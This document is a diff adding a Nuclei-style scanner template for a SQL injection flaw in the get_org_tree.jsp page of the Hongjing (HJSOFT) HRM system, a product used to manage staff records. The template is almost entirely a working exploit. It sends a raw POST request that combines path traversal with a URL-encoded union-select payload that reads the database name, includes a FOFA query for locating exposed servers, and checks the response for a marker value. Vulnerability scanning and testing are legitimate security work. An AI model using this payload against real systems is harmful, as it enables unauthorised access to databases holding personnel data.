@@ -1,0 +1,29 @@
+id: hjsoft-get_org_tree-sqli
+
+info:
+  name: 宏景人力资源信息管理系统 get_org_tree.jsp - sqli
+  author: leadlife
+  severity: high
+  description: 
+  metadata:
+    verified: true
+    fofa-qeury: app="HJSOFT-HCM"
+  tags: hjsoft,sqli
+
+http:
+  - raw:
+      - |-
+        POST /templates/attestation/../../kq/app_check_in/get_org_tree.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 136
+
+        params=%31%3D%30%20%75%6E%69%6F%6E%20%73%65%6C%65%63%74%20%31%2C%64%62%5F%6E%61%6D%65%28%29%2C%31%30%31%20%2A%20%31%32%36%2C%34%2D%2D%2B
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body,"12726")
+        condition: and
+
